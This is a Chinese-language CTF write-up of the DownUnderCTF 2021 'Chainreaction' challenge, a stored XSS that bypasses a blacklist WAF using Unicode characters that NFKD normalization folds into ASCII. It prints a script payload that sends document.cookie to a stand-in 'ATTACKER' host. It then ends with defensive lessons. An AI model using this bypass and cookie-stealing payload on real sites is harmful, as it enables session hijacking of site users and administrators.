# DownUnderCTF 2021 - Chainreaction

## 题目简述

个人资料字段经过黑名单检查后才做 Unicode NFKD 规范化，渲染模板又主动关闭 HTML 转义。利用能在 NFKD 下折叠成 `<script>` 的兼容字符，可以让输入通过 WAF、入库后变成真实标签；管理员机器人访问资料页时触发存储型 XSS，进而泄露非 `HttpOnly` 的管理 Cookie。

## 解题过程

### 从开发聊天定位错误顺序

登录页指向 `/dev`，页面又提示已有开发权限的人访问 `/devchat`。该接口没有权限校验，聊天内容明确给出两条重要信息：

- 为解决异常字符问题，资料字段会使用 NFKD 规范化；
- 开发者认为 HTML 转义影响显示，于是在资料页面关闭了自动转义。

源码证实资料更新逻辑的顺序是先检查、后规范化：

```python
aboutme = request.form["aboutme"]
if not waf(aboutme.lower()):
    update.aboutme = unicodedata.normalize("NFKD", aboutme)
```

而 `profile.html` 整段位于：

```jinja2
{% autoescape false %}
...
{{ user_data.aboutme }}
...
{% endautoescape %}
```

所以数据库中只要出现标签，就会原样进入管理员的 DOM。

### 用兼容字符绕过 WAF

黑名单包含 `<`、`>` 和 `script` 等普通 ASCII 片段，但检查发生在 NFKD 之前。以下字符在检查时不同，规范化后却会折叠为 ASCII：

| 原字符 | NFKD 结果 |
| --- | --- |
| `﹤` | `<` |
| `﹥` | `>` |
| `ˢ` | `s` |
| `ⁱ` | `i` |

因此可把资料简介改为：

```html
﹤ˢcrⁱpt﹥fetch("https://ATTACKER/?c="+encodeURIComponent(document.cookie))﹤/ˢcrⁱpt﹥
```

WAF 看不到完整的 `<script>`，但保存值经 NFKD 后等价于：

```html
<script>fetch("https://ATTACKER/?c="+encodeURIComponent(document.cookie))</script>
```

### 让管理员触发并取得 flag

`/api/v1/report` 会让机器人访问当前用户的资料页。管理员携带名为 `admin-cookie` 的 Cookie，且部署给机器人的 Cookie 没有设置 `HttpOnly`，所以脚本可以通过 `document.cookie` 读取并发送到接收端。

把泄露到的值设置为自己的 `admin-cookie` 后访问 `/admin`，模板直接给出：

```text
DUCTF{_un1c0de_bypass_x55_ftw!}
```

## 方法总结

漏洞链由三个独立缺陷组成：公开的开发聊天泄露实现线索、WAF 与 NFKD 规范化顺序错误、资料模板关闭自动转义。输入校验必须作用在最终被解释的规范形式上，并在输出位置继续执行上下文相关编码；仅靠字符黑名单无法抵御 Unicode 兼容字符产生的存储型 XSS。
